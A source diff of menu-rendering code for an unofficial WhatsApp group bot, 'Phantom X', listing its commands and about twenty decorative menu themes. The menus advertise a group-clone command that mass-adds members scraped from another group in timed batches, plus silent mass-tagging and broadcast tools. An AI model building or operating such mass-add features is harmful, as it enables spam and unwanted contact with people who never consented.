+    const isStyle2 = Number(styleNum) === 2;
+    let out = isStyle2
+        ? `╔══════════════════════╗\n║  ${sec.emoji}  *${sec.title}*\n╚══════════════════════╝\n`
+        : `┏━━━━━━━━━━━━━━━━━━━┓\n   ${sec.emoji}  *${sec.title}*\n┗━━━━━━━━━━━━━━━━━━━┛\n`;
+    sec.items.forEach(it => { out += `• ${it[0]}\n`; });
+    out += `\n_Section ${idx + 1}_  •  _.menu = back to picker_`;
+    return out;
+}
+
+function buildGroupMenuList() {
+    return `👥 *GROUP MENU LIST*
+━━━━━━━━━━━━━━━━━━━━
+
+*Admin Actions*
+• *.add <number>* — Add member
+• *.kick @user* — Remove member
+• *.promote @user* — Make admin
+• *.demote @user* — Remove admin
+• *.lock* — Lock group (admins-only messages)
+• *.unlock* — Open group to everyone
+• *.mute @user* — Silence a specific user (auto-deletes their messages)
+• *.unmute @user* — Remove silence from a user
+
+*Group Info*
+• *.link* — Get invite link
+• *.revoke* — Reset invite link
+• *.groupinfo* — Group details
+• *.adminlist* — List admins
+• *.membercount* — Count members
+• *.groupid* — Show group ID
+
+*Tag & Broadcast*
+• *.everyone <msg>* — Tag everyone
+• *.tagall* — Visible tag all
+• *.hidetag* — Silent tag all
+• *.broadcast <mins> <msg>* — Group broadcast
+• *.stopbroadcast* — Stop broadcast
+
+*Protection*
+• *.antilink on/off*
+• *.antispam on/off*
+• *.antidemote on/off*
+• *.antidelete on/off*
+• *.antibot on/off*
+• *.antibug on/off/status*
+
+_Most group actions need the linked WhatsApp number to be admin._`;
+}
+
+function buildListMenu() {
+    return `📋 *PHANTOM X LIST MENUS*
+━━━━━━━━━━━━━━━━━━━━
+
+• *.list group menu* — All group commands
+• *.list protection menu* — Protection commands
+• *.list utility menu* — Number info and utility tools
+• *.list owner menu* — Owner controls
+• *.list clone menu* — GC clone guide
+• *.list fun menu* — Fun commands
+• *.list game menu* — Game commands
+
+You can also use:
+• *.help group menu*`;
+}
+
+function buildSimpleSectionList(section) {
+    const sections = {
+        "protection": `🛡️ *PROTECTION MENU*
+━━━━━━━━━━━━━━━━━━━━
+• *.antilink on/off*
+• *.antispam on/off*
+• *.antidemote on/off*
+• *.antidelete on/off*
+• *.antibot on/off*
+• *.antibug on/off/status*
+
+*.antibug on* activates the shield on the linked bot number.`,
+        "utility": `🔍 *UTILITY MENU*
+━━━━━━━━━━━━━━━━━━━━
+• *.numinfo <number>* — Show country/prefix info
+• *.targetloc <number>* — Same as numinfo
+• *.calc <expression>* — Calculator
+• *.groupid* — Show group/community ID
+• *.listonline* — List online members
+• *.listoffline* — List offline members
+• *.bible <verse>*
+• *.quran <surah:ayah>*
+
+_Number info is prefix-based only, not live GPS location._`,
+        "owner": `👑 *OWNER CONTROL MENU*
+━━━━━━━━━━━━━━━━━━━━
+• *.restart* — Restart/reconnect the linked WhatsApp session
+• *.mode public/owner*
+• *.menudesign 1-20*
+• *.setpp [owner]* — Set menu banner (reply to image)
+• *.setmenupic* — Set main menu banner
+• *.setmenupic owner* — Set owner menu banner
+• *.delpp* — Delete main menu banner
+• *.delpp owner* — Delete owner menu banner
+• *.setstatus <text>*
+• *.setname <name>*
+• *.info*
+• *.ping*`,
+        "clone": `🔄 *GC CLONE MENU*
+━━━━━━━━━━━━━━━━━━━━
+• *.clone <source> <dest> <batch> <mins>*
+• *.stopclone*
+
+Source/Dest can be a group ID or invite link.
+The bot can start this from any chat, but WhatsApp only exposes source members if the linked account can access that source group, and adding to destination requires admin access.`,
+        "tag": `🏷️ *TAG MENU*
+━━━━━━━━━━━━━━━━━━━━
+• *.tagall <msg>* — Tag everyone visibly
+• *.hidetag <msg>* — Mention everyone silently
+• *.tagadmin <msg>* — Tag admins only
+• *.everyone <msg>*
+• *.broadcast <mins> <msg>*`,
+        "fun": `😂 *FUN MENU*
+━━━━━━━━━━━━━━━━━━━━
+• *.joke*
+• *.fact*
+• *.quote*
+• *.roast @user*
+• *.compliment @user*
+• *.ship @user1 @user2*
+• *.rate @user*
+• *.vibe @user*
+• *.horoscope <sign>*`,
+        "game": `🎮 *GAME MENU*
+━━━━━━━━━━━━━━━━━━━━
+• *.ttt @p1 @p2*
+• *.truth*
+• *.dare*
+• *.wordchain <word>*
+• *.flip*
+• *.dice*
+• *.8ball <question>*
+• *.rps rock/paper/scissors*
+• *.slots*
+• *.trivia*
+• *.hangman <guess>*
+• *.numguess*
+• *.riddle*
+• *.mathquiz*
+• *.wouldurather*
+• *.scramble*`,
+    };
+    return sections[section] || buildListMenu();
+}
+
+// ─── THEME 1: GHOST ───
+function buildThemeGhost(ml, time, up, S) {
+    let o = `╭━━━━━━━━━━━━━━━━━━━━━━━━━━╮\n   ☠️  *P H A N T O M  ✘*  ☠️\n   _The Ghost in Your Machine_ 👻\n╰━━━━━━━━━━━━━━━━━━━━━━━━━━╯\n\n◈ ◈ ◈  *S Y S T E M  S T A T U S*  ◈ ◈ ◈\n\n  🤖  *Bot*     ›  Phantom X\n  📌  *Ver*     ›  v${BOT_VERSION}\n  🌐  *Mode*    ›  ${ml}\n  ⏱️  *Uptime*  ›  ${up}\n  🕐  *Time*    ›  ${time}\n`;
+    for (const s of S) { o += `\n┄┄┄┄┄┄┄┄┄┄┄┄┄┄┄┄┄┄┄┄┄┄┄┄┄┄┄\n\n〔 ${s.emoji} *${s.title}* 〕\n\n`; for (const [c] of s.items) o += `  ✦  *${c}*\n`; }
+    return (o + `\n╭━━━━━━━━━━━━━━━━━━━━━━━━━━╮\n  💀 _Phantom X — Built Different. Built Cold._ 🖤\n╰━━━━━━━━━━━━━━━━━━━━━━━━━━╯`).trim();
+}
+
+// ─── THEME 2: MATRIX ───
+function buildThemeMatrix(ml, time, up, S) {
+    let o = `█▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀█\n█   💻  *PHANTOM_X  v${BOT_VERSION}*   💻   █\n█   _> SYSTEM ONLINE ✓_         █\n█▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄█\n\n*[ SYS_INFO ]*\n  »  *Bot*    :  Phantom X\n  »  *Mode*   :  ${ml}\n  »  *Uptime* :  ${up}\n  »  *Time*   :  ${time}\n`;
+    for (const s of S) { o += `\n══════════════════════════════\n*[ MODULE :: ${s.title} ]*  ${s.emoji}\n`; for (const [c] of s.items) o += `  *>*  \`${c}\`\n`; }
+    return (o + `\n══════════════════════════════\n_> PHANTOM_X — Ghost Protocol Active._ 👻`).trim();
+}
+
+// ─── THEME 3: ROYAL ───
+function buildThemeRoyal(ml, time, up, S) {
+    let o = `♛━━━━━━━━━━━━━━━━━━━━━━━━━━♛\n         👑  *PHANTOM X*  👑\n    _ꜱɪʟᴇɴᴛ. ᴅᴇᴀᴅʟʏ. ᴅɪɢɪᴛᴀʟ._\n♛━━━━━━━━━━━━━━━━━━━━━━━━━━♛\n\n✦ *ROYAL STATUS* ✦\n\n   ◆  *Bot*     ∷  Phantom X\n   ◆  *Version* ∷  v${BOT_VERSION}\n   ◆  *Mode*    ∷  ${ml}\n   ◆  *Uptime*  ∷  ${up}\n   ◆  *Time*    ∷  ${time}\n`;
+    for (const s of S) { o += `\n═══════════════════════════════\n❖  *${s.emoji} ${s.title}*  ❖\n\n`; for (const [c] of s.items) o += `   ◆  *${c}*\n`; }
+    return (o + `\n♛━━━━━━━━━━━━━━━━━━━━━━━━━━♛\n  👑 _Phantom X — The Digital Monarch_ 🖤\n♛━━━━━━━━━━━━━━━━━━━━━━━━━━♛`).trim();
+}
+
+// ─── THEME 4: INFERNO ───
+function buildThemeInferno(ml, time, up, S) {
+    let o = `🔥━━━━━━━━━━━━━━━━━━━━━━━━━━🔥\n   💥  *P H A N T O M  X*  💥\n   _No Cap. No Mercy. Built Cold._ 🥶\n🔥━━━━━━━━━━━━━━━━━━━━━━━━━━🔥\n\n⚡ *SYSTEM STATUS* ⚡\n\n  🔸  *Bot*     »  Phantom X\n  🔸  *Version* »  v${BOT_VERSION}\n  🔸  *Mode*    »  ${ml}\n  🔸  *Uptime*  »  ${up}\n  🔸  *Time*    »  ${time}\n`;
+    for (const s of S) { o += `\n🔥🔥🔥🔥🔥🔥🔥🔥🔥🔥🔥🔥🔥🔥\n💀 *${s.emoji} ${s.title}* 💀\n\n`; for (const [c] of s.items) o += `  ⚡  *${c}*\n`; }
+    return (o + `\n🔥━━━━━━━━━━━━━━━━━━━━━━━━━━🔥\n  💀 _Phantom X — Straight Savage. No Filter._ 🔥\n🔥━━━━━━━━━━━━━━━━━━━━━━━━━━🔥`).trim();
+}
+
+// ─── THEME 5: MINIMAL ───
+function buildThemeMinimal(ml, time, up, S) {
+    let o = `─────────────────────────────\n   ✧  *PHANTOM X*  ·  v${BOT_VERSION}  ✧\n─────────────────────────────\n\n  Bot    ·  Phantom X\n  Mode   ·  ${ml}\n  Uptime ·  ${up}\n  Time   ·  ${time}\n`;
+    for (const s of S) { o += `\n─────────────────────────────\n  *${s.emoji} ${s.title}*\n─────────────────────────────\n`; for (const [c] of s.items) o += `  ›  *${c}*\n`; }
+    return (o + `\n─────────────────────────────\n  _Phantom X — Built Different_ 🖤\n─────────────────────────────`).trim();
+}
+
+// ─── THEME 6: VOID (Ultimate Hacker · Echo Protocol) ───
+function buildThemeVoid(ml, time, up, S) {
+    let o = `▓▒░▒▓░▒▓░▒▓░▒▓░▒▓░▒▓░▒▓░▒▓\n\n        𝚅  𝙾  𝙸  𝙳\n   𝙿𝙷𝙰𝙽𝚃𝙾𝙼_𝚇 :: 𝙴𝙲𝙷𝙾_𝙿𝚁𝙾𝚃𝙾𝙲𝙾𝙻\n\n▓▒░▒▓░▒▓░▒▓░▒▓░▒▓░▒▓░▒▓░▒▓\n\n> initializing ghost_shell...\n> loading kernel............. ✓\n> bypassing firewall......... ✓\n> identity_mask: ONLINE ✓\n> threat_level: MAXIMUM 🔴\n\n╔══════════════════════════╗\n║  *0x01*  BOT    →  𝙿𝚑𝚊𝚗𝚝𝚘𝚖 𝚇  ║\n║  *0x02*  VER    →  v${BOT_VERSION}         ║\n║  *0x03*  MODE   →  ${ml}  ║\n║  *0x04*  UPTIME →  ${up}  ║\n╚══════════════════════════╝\n`;
+    let i = 0;
+    for (const s of S) {
+        o += `\n▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀\n:: ${s.emoji} ${s.title} ::\n▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄\n`;
+        for (const [c] of s.items) { i++; o += `  [*${String(i).padStart(2,'0')}*]  *${c}*\n`; }
+    }
+    return (o + `\n▓▒░▒▓░▒▓░▒▓░▒▓░▒▓░▒▓░▒▓░▒▓\n> 𝚃𝚁𝙰𝙽𝚂𝙼𝙸𝚂𝚂𝙸𝙾𝙽_𝙴𝙽𝙳 ◆ 𝙶𝙷𝙾𝚂𝚃_𝙿𝚁𝙾𝚃𝙾𝙲𝙾𝙻_𝙰𝙲𝚃𝙸𝚅𝙴\n▓▒░▒▓░▒▓░▒▓░▒▓░▒▓░▒▓░▒▓░▒▓`).trim();
+}
+
+// ─── THEME 7: VAPORWAVE ───
+function buildThemeVaporwave(ml, time, up, S) {
+    let o = `░░░░░░░░░░░░░░░░░░░░░░░░░░░\n\n  Ｐ Ｈ Ａ Ｎ Ｔ Ｏ Ｍ  Ｘ\n  ａ ｅ ｓ ｔ ｈ ｅ ｔ ｉ ｃ\n\n░░░░░░░░░░░░░░░░░░░░░░░░░░░\n\n  ♡  Ｂｏｔ      ：  Ｐｈａｎｔｏｍ Ｘ\n  ♡  Ｖｅｒｓｉｏｎ  ：  ｖ${BOT_VERSION}\n  ♡  Ｍｏｄｅ     ：  ${ml}\n  ♡  Ｕｐｔｉｍｅ   ：  ${up}\n  ♡  Ｔｉｍｅ     ：  ${time}\n`;
+    for (const s of S) { o += `\n▱▱▱▱▱▱▱▱▱▱▱▱▱▱▱▱▱▱▱▱▱▱▱▱▱\n  ${s.emoji}  ｛  *${s.title}*  ｝\n▱▱▱▱▱▱▱▱▱▱▱▱▱▱▱▱▱▱▱▱▱▱▱▱▱\n`; for (const [c] of s.items) o += `  ✦ ｜  *${c}*\n`; }
+    return (o + `\n░░░░░░░░░░░░░░░░░░░░░░░░░░░\n  ｐｈａｎｔｏｍ ｘ  ♡  ｂｕｉｌｔ ｄｉｆｆｅｒｅｎｔ\n░░░░░░░░░░░░░░░░░░░░░░░░░░░`).trim();
+}
+
+// ─── THEME 8: GOTHIC ───
+function buildThemeGothic(ml, time, up, S) {
+    let o = `✠━━━━━━━━━━━━━━━━━━━━━━━━━━✠\n\n   𝔓 𝔥 𝔞 𝔫 𝔱 𝔬 𝔪  𝔛\n  _𝔗𝔥𝔢 𝔇𝔞𝔯𝔨 𝔒𝔯𝔡𝔢𝔯 𝔄𝔴𝔞𝔨𝔢𝔫𝔰_\n\n✠━━━━━━━━━━━━━━━━━━━━━━━━━━✠\n\n  ☩  𝔅𝔬𝔱      ∶  𝔓𝔥𝔞𝔫𝔱𝔬𝔪 𝔛\n  ☩  𝔙𝔢𝔯𝔰𝔦𝔬𝔫  ∶  ｖ${BOT_VERSION}\n  ☩  𝔐𝔬𝔡𝔢     ∶  ${ml}\n  ☩  𝔘𝔭𝔱𝔦𝔪𝔢   ∶  ${up}\n  ☩  𝔗𝔦𝔪𝔢     ∶  ${time}\n`;
+    for (const s of S) { o += `\n✠═══════════════════════════✠\n  ☩  *${s.emoji} ${s.title}*\n✠═══════════════════════════✠\n`; for (const [c] of s.items) o += `  ✝  *${c}*\n`; }
+    return (o + `\n✠━━━━━━━━━━━━━━━━━━━━━━━━━━✠\n  ☩ _𝔓𝔥𝔞𝔫𝔱𝔬𝔪 𝔛 — 𝔅𝔲𝔦𝔩𝔱 𝔬𝔣 𝔇𝔞𝔯𝔨𝔫𝔢𝔰𝔰_ 🖤\n✠━━━━━━━━━━━━━━━━━━━━━━━━━━✠`).trim();
+}
+
+// ─── THEME 9: CURSIVE ───
+function buildThemeCursive(ml, time, up, S) {
+    let o = `❦━━━━━━━━━━━━━━━━━━━━━━━━━━❦\n\n   𝒫 𝒽 𝒶 𝓃 𝓉 ℴ 𝓂  𝒳\n  _𝒢𝒽ℴ𝓈𝓉 𝒾𝓃 𝓉𝒽ℯ 𝒮𝒽ℯ𝓁𝓁_ ✨\n\n❦━━━━━━━━━━━━━━━━━━━━━━━━━━❦\n\n  ❧  𝐵ℴ𝓉      ·  𝒫𝒽𝒶𝓃𝓉ℴ𝓂 𝒳\n  ❧  𝒱ℯ𝓇𝓈𝒾ℴ𝓃  ·  v${BOT_VERSION}\n  ❧  𝑀ℴ𝒹ℯ     ·  ${ml}\n  ❧  𝒰𝓅𝓉𝒾𝓂ℯ   ·  ${up}\n  ❧  𝒯𝒾𝓂ℯ     ·  ${time}\n`;
+    for (const s of S) { o += `\n❦───────────────────────────❦\n  ❧ *${s.emoji} ${s.title}*\n❦───────────────────────────❦\n`; for (const [c] of s.items) o += `  ❧  *${c}*\n`; }
+    return (o + `\n❦━━━━━━━━━━━━━━━━━━━━━━━━━━❦\n  ❧ _𝒫𝒽𝒶𝓃𝓉ℴ𝓂 𝒳 — 𝐵𝓊𝒾𝓁𝓉 𝒟𝒾𝒻𝒻ℯ𝓇ℯ𝓃𝓉_ 🖤\n❦━━━━━━━━━━━━━━━━━━━━━━━━━━❦`).trim();
+}
+
+// ─── THEME 10: COSMOS ───
+function buildThemeCosmos(ml, time, up, S) {
+    let o = `🌌✦━━━━━━━━━━━━━━━━━━━━━━━✦🌌\n\n   🛸  *P H A N T O M  X*  🛸\n   _Drifting Through the Digital Void_\n\n🌌✦━━━━━━━━━━━━━━━━━━━━━━━✦🌌\n\n  🌟  *Bot*     ⟶  Phantom X\n  🪐  *Version* ⟶  v${BOT_VERSION}\n  🛰️  *Mode*    ⟶  ${ml}\n  ☄️  *Uptime*  ⟶  ${up}\n  🌙  *Time*    ⟶  ${time}\n`;
+    for (const s of S) { o += `\n✦━━━━━━━━━━━━━━━━━━━━━━━━━━✦\n🌌 *${s.emoji} ${s.title}* 🌌\n✦━━━━━━━━━━━━━━━━━━━━━━━━━━✦\n`; for (const [c] of s.items) o += `  🌠  *${c}*\n`; }
+    return (o + `\n🌌✦━━━━━━━━━━━━━━━━━━━━━━━✦🌌\n  🛸 _Phantom X — Lost in the Stars_ ✨\n🌌✦━━━━━━━━━━━━━━━━━━━━━━━✦🌌`).trim();
+}
+
+// ─── THEME 11: SOFT ───
+function buildThemeSoft(ml, time, up, S) {
+    let o = `˚ʚ♡ɞ˚━━━━━━━━━━━━━━━━━━━━˚ʚ♡ɞ˚\n\n   ℙ ℍ 𝔸 ℕ 𝕋 𝕆 𝕄  𝕏\n  _ꜱᴏꜰᴛ. ꜱɪʟᴇɴᴛ. ᴅᴇᴀᴅʟʏ._ 🌸\n\n˚ʚ♡ɞ˚━━━━━━━━━━━━━━━━━━━━˚ʚ♡ɞ˚\n\n  ˚✦  *ᴮᵒᵗ*       ⌇  Phantom X\n  ˚✦  *ᵛᵉʳˢⁱᵒⁿ*   ⌇  v${BOT_VERSION}\n  ˚✦  *ᴹᵒᵈᵉ*      ⌇  ${ml}\n  ˚✦  *ᵁᵖᵗⁱᵐᵉ*    ⌇  ${up}\n  ˚✦  *ᵀⁱᵐᵉ*      ⌇  ${time}\n`;
+    for (const s of S) { o += `\n˚ · . ꒰ ${s.emoji} *${s.title}* ꒱ . · ˚\n`; for (const [c] of s.items) o += `  ♡  *${c}*\n`; }
+    return (o + `\n˚ʚ♡ɞ˚━━━━━━━━━━━━━━━━━━━━˚ʚ♡ɞ˚\n  🌸 _Phantom X — Soft but Deadly_ 💫\n˚ʚ♡ɞ˚━━━━━━━━━━━━━━━━━━━━˚ʚ♡ɞ˚`).trim();
+}
+
+// ─── THEME 12: DIAMOND ───
+function buildThemeDiamond(ml, time, up, S) {
+    let o = `◇◆◇◆◇◆◇◆◇◆◇◆◇◆◇◆◇◆◇◆◇◆◇◆◇\n\n   💎  *𝐏 𝐇 𝐀 𝐍 𝐓 𝐎 𝐌  𝐗*  💎\n   _𝐄𝐥𝐢𝐭𝐞. 𝐏𝐨𝐥𝐢𝐬𝐡𝐞𝐝. 𝐋𝐞𝐠𝐞𝐧𝐝𝐚𝐫𝐲._\n\n◇◆◇◆◇◆◇◆◇◆◇◆◇◆◇◆◇◆◇◆◇◆◇◆◇\n\n  💠  *𝐁𝐨𝐭*      ⬩  𝐏𝐡𝐚𝐧𝐭𝐨𝐦 𝐗\n  💠  *𝐕𝐞𝐫𝐬𝐢𝐨𝐧* ⬩  v${BOT_VERSION}\n  💠  *𝐌𝐨𝐝𝐞*     ⬩  ${ml}\n  💠  *𝐔𝐩𝐭𝐢𝐦𝐞*   ⬩  ${up}\n  💠  *𝐓𝐢𝐦𝐞*     ⬩  ${time}\n`;
+    for (const s of S) { o += `\n◆◇◆◇◆◇◆◇◆◇◆◇◆◇◆◇◆◇◆◇◆◇◆◇◆\n💎 *${s.emoji} ${s.title}* 💎\n◆◇◆◇◆◇◆◇◆◇◆◇◆◇◆◇◆◇◆◇◆◇◆◇◆\n`; for (const [c] of s.items) o += `  ◆  *${c}*\n`; }
+    return (o + `\n◇◆◇◆◇◆◇◆◇◆◇◆◇◆◇◆◇◆◇◆◇◆◇◆◇\n  💎 _Phantom X — Rare. Refined. Relentless._ 💎\n◇◆◇◆◇◆◇◆◇◆◇◆◇◆◇◆◇◆◇◆◇◆◇◆◇`).trim();
+}
+
+// ─── THEME 13: THUNDER ───
+function buildThemeThunder(ml, time, up, S) {
+    let o = `⚡━━━━━━━━━━━━━━━━━━━━━━━━━━⚡\n\n  ⚡  *𝗣 𝗛 𝗔 𝗡 𝗧 𝗢 𝗠  𝗫*  ⚡\n  _𝗦𝘁𝗿𝗶𝗸𝗲𝘀 𝗟𝗶𝗸𝗲 𝗟𝗶𝗴𝗵𝘁𝗻𝗶𝗻𝗴. 𝗡𝗼 𝗪𝗮𝗿𝗻𝗶𝗻𝗴._\n\n⚡━━━━━━━━━━━━━━━━━━━━━━━━━━⚡\n\n  ⚡  *𝗕𝗼𝘁*      ⟹  Phantom X\n  ⚡  *𝗩𝗲𝗿𝘀𝗶𝗼𝗻* ⟹  v${BOT_VERSION}\n  ⚡  *𝗠𝗼𝗱𝗲*     ⟹  ${ml}\n  ⚡  *𝗨𝗽𝘁𝗶𝗺𝗲*  ⟹  ${up}\n  ⚡  *𝗧𝗶𝗺𝗲*     ⟹  ${time}\n`;
+    for (const s of S) { o += `\n⚡⚡⚡⚡⚡⚡⚡⚡⚡⚡⚡⚡⚡⚡⚡\n  *${s.emoji} ${s.title}*\n⚡⚡⚡⚡⚡⚡⚡⚡⚡⚡⚡⚡⚡⚡⚡\n`; for (const [c] of s.items) o += `  ⚡  *${c}*\n`; }
+    return (o + `\n⚡━━━━━━━━━━━━━━━━━━━━━━━━━━⚡\n  ⚡ _Phantom X — 𝗨𝗻𝘀𝘁𝗼𝗽𝗽𝗮𝗯𝗹𝗲. 𝗨𝗻𝘁𝗿𝗮𝗰𝗲𝗮𝗯𝗹𝗲._ ⚡\n⚡━━━━━━━━━━━━━━━━━━━━━━━━━━⚡`).trim();
+}
+
+// ─── THEME 14: WARRIOR ───
+function buildThemeWarrior(ml, time, up, S) {
+    let o = `⚔️ ━━━━━━━━━━━━━━━━━━━━━━━ ⚔️\n\n   🛡️  *ᴘʜᴀɴᴛᴏᴍ  x*  🛡️\n   _ꜰᴏʀɢᴇᴅ ɪɴ ᴛʜᴇ ᴅɪɢɪᴛᴀʟ ꜰɪʀᴇ_\n\n⚔️ ━━━━━━━━━━━━━━━━━━━━━━━ ⚔️\n\n  🗡️  *ʙᴏᴛ*      ⟫  Phantom X\n  🗡️  *ᴠᴇʀꜱɪᴏɴ*  ⟫  v${BOT_VERSION}\n  🗡️  *ᴍᴏᴅᴇ*     ⟫  ${ml}\n  🗡️  *ᴜᴘᴛɪᴍᴇ*   ⟫  ${up}\n  🗡️  *ᴛɪᴍᴇ*     ⟫  ${time}\n`;
+    for (const s of S) { o += `\n⚔️ ──────────────────────── ⚔️\n  🛡️ *${s.emoji} ${s.title}*\n⚔️ ──────────────────────── ⚔️\n`; for (const [c] of s.items) o += `  🗡️  *${c}*\n`; }
+    return (o + `\n⚔️ ━━━━━━━━━━━━━━━━━━━━━━━ ⚔️\n  🛡️ _ᴘʜᴀɴᴛᴏᴍ x — ɴᴏ ᴍᴇʀᴄʏ. ɴᴏ ʀᴇᴛʀᴇᴀᴛ._ ⚔️\n⚔️ ━━━━━━━━━━━━━━━━━━━━━━━ ⚔️`).trim();
+}
+
+// ─── THEME 15: NEON ───
+function buildThemeNeon(ml, time, up, S) {
+    let o = `🟣🔵🟢🟡🟠🔴🟣🔵🟢🟡🟠🔴🟣\n\n  🌈  *Ⓟ Ⓗ Ⓐ Ⓝ Ⓣ Ⓞ Ⓜ  ✘*  🌈\n  _Ⓛⓘⓣ  ⓤⓟ.  Ⓑⓤⓘⓛⓣ  ⓓⓘⓕⓕⓔⓡⓔⓝⓣ._\n\n🟣🔵🟢🟡🟠🔴🟣🔵🟢🟡🟠🔴🟣\n\n  🟣  *Bot*      ⇒  Phantom X\n  🔵  *Version*  ⇒  v${BOT_VERSION}\n  🟢  *Mode*     ⇒  ${ml}\n  🟡  *Uptime*   ⇒  ${up}\n  🟠  *Time*     ⇒  ${time}\n`;
+    const neonDots = ['🟣','🔵','🟢','🟡','🟠','🔴']; let ni = 0;
+    for (const s of S) { o += `\n🌈━━━━━━━━━━━━━━━━━━━━━━━━━━🌈\n${neonDots[ni%6]}  *${s.emoji} ${s.title}*\n🌈━━━━━━━━━━━━━━━━━━━━━━━━━━🌈\n`; ni++; for (const [c] of s.items) o += `  ${neonDots[ni%6]}  *${c}*\n`; }
+    return (o + `\n🟣🔵🟢🟡🟠🔴🟣🔵🟢🟡🟠🔴🟣\n  🌈 _Phantom X — Neon. Bold. Unstoppable._ 🌈\n🟣🔵🟢🟡🟠🔴🟣🔵🟢🟡🟠🔴🟣`).trim();
+}
+
+// ─── THEME 16: SPY ───
+function buildThemeSpy(ml, time, up, S) {
+    let o = `🕵️ ▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓ 🕵️\n\n  ██  *[CLASSIFIED]*  ██\n  *PHANTOM X* — OPERATION: GHOST\n  _CLEARANCE LEVEL: ULTRA_ 🔐\n\n🕵️ ▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓ 🕵️\n\n  🔐  *AGENT*    :  PHANTOM X\n  🔐  *VERSION*  :  v${BOT_VERSION} [REDACTED]\n  🔐  *ACCESS*   :  ${ml}\n  🔐  *RUNTIME*  :  ${up}\n  🔐  *LOCAL_T*  :  ${time}\n`;
+    for (const s of S) { o += `\n██████████████████████████\n🔐 *[MODULE :: ${s.title}]* ${s.emoji}\n██████████████████████████\n`; for (const [c] of s.items) o += `  ⬛  *${c}*\n`; }
+    return (o + `\n🕵️ ▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓ 🕵️\n  🔐 _[END OF FILE] — PHANTOM X // EYES ONLY_ 🕵️\n🕵️ ▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓ 🕵️`).trim();
+}
+
+// ─── THEME 17: PIRATE ───
+function buildThemePirate(ml, time, up, S) {
+    let o = `🏴‍☠️━━━━━━━━━━━━━━━━━━━━━━━━🏴‍☠️\n\n   ☠️  *P H A N T O M  X*  ☠️\n   _Sail the Digital Seas. Fear No Code._\n\n🏴‍☠️━━━━━━━━━━━━━━━━━━━━━━━━🏴‍☠️\n\n  ⚓  *Ship*    »  Phantom X\n  ⚓  *Ver*     »  v${BOT_VERSION}\n  ⚓  *Crew*    »  ${ml}\n  ⚓  *Voyage*  »  ${up}\n  ⚓  *Waters*  »  ${time}\n`;
+    for (const s of S) { o += `\n☠️ ─────────────────────────☠️\n  ⚓ *${s.emoji} ${s.title}*\n☠️ ─────────────────────────☠️\n`; for (const [c] of s.items) o += `  🗺️  *${c}*\n`; }
+    return (o + `\n🏴‍☠️━━━━━━━━━━━━━━━━━━━━━━━━🏴‍☠️\n  ⚓ _Phantom X — Plunder the Net. Leave No Trace._ ☠️\n🏴‍☠️━━━━━━━━━━━━━━━━━━━━━━━━🏴‍☠️`).trim();
+}
+
+// ─── THEME 18: SHADOW ───
+function buildThemeShadow(ml, time, up, S) {
+    let o = `◼◼◼◼◼◼◼◼◼◼◼◼◼◼◼◼◼◼◼◼◼◼◼◼◼\n\n   🌑  *𝑷 𝑯 𝑨 𝑵 𝑻 𝑶 𝑴  𝑿*  🌑\n   _𝘈𝘭𝘸𝘢𝘺𝘴 𝘞𝘢𝘵𝘤𝘩𝘪𝘯𝘨. 𝘕𝘦𝘷𝘦𝘳 𝘚𝘦𝘦𝘯._\n\n◼◼◼◼◼◼◼◼◼◼◼◼◼◼◼◼◼◼◼◼◼◼◼◼◼\n\n  🌑  *Bot*      ⌁  Phantom X\n  🌑  *Version*  ⌁  v${BOT_VERSION}\n  🌑  *Mode*     ⌁  ${ml}\n  🌑  *Uptime*   ⌁  ${up}\n  🌑  *Time*     ⌁  ${time}\n`;
+    for (const s of S) { o += `\n◾◾◾◾◾◾◾◾◾◾◾◾◾◾◾◾◾◾◾◾◾◾◾◾◾\n  🌑 *${s.emoji} ${s.title}*\n◾◾◾◾◾◾◾◾◾◾◾◾◾◾◾◾◾◾◾◾◾◾◾◾◾\n`; for (const [c] of s.items) o += `  🌑  *${c}*\n`; }
+    return (o + `\n◼◼◼◼◼◼◼◼◼◼◼◼◼◼◼◼◼◼◼◼◼◼◼◼◼\n  🌑 _Phantom X — The Shadow Never Sleeps_ 🖤\n◼◼◼◼◼◼◼◼◼◼◼◼◼◼◼◼◼◼◼◼◼◼◼◼◼`).trim();
+}
+
+// ─── THEME 19: BOLD TECH ───
+function buildThemeBoldTech(ml, time, up, S) {
+    let o = `▰▰▰▰▰▰▰▰▰▰▰▰▰▰▰▰▰▰▰▰▰▰▰▰▰\n\n  🔲  *𝑷 𝑯 𝑨 𝑵 𝑻 𝑶 𝑴  𝑿*\n  _𝑷𝒓𝒐𝒈𝒓𝒂𝒎𝒎𝒆𝒅 𝒕𝒐 𝑫𝒐𝒎𝒊𝒏𝒂𝒕𝒆._\n\n▰▰▰▰▰▰▰▰▰▰▰▰▰▰▰▰▰▰▰▰▰▰▰▰▰\n\n  ▣  *Bot*      →  Phantom X\n  ▣  *Version*  →  v${BOT_VERSION}\n  ▣  *Mode*     →  ${ml}\n  ▣  *Uptime*   →  ${up}\n  ▣  *Time*     →  ${time}\n`;
+    for (const s of S) { o += `\n▰▱▰▱▰▱▰▱▰▱▰▱▰▱▰▱▰▱▰▱▰▱▰▱▰\n  ▣ *${s.emoji} ${s.title}*\n▰▱▰▱▰▱▰▱▰▱▰▱▰▱▰▱▰▱▰▱▰▱▰▱▰\n`; for (const [c] of s.items) o += `  ▣  *${c}*\n`; }
+    return (o + `\n▰▰▰▰▰▰▰▰▰▰▰▰▰▰▰▰▰▰▰▰▰▰▰▰▰\n  ▣ _Phantom X — 𝑷𝒓𝒆𝒄𝒊𝒔𝒊𝒐𝒏. 𝑷𝒐𝒘𝒆𝒓. 𝑷𝒉𝒂𝒏𝒕𝒐𝒎._ 🔲\n▰▰▰▰▰▰▰▰▰▰▰▰▰▰▰▰▰▰▰▰▰▰▰▰▰`).trim();
+}
+
+// ─── THEME 20: ECHO ───
+function buildThemeEcho(ml, time, up, S) {
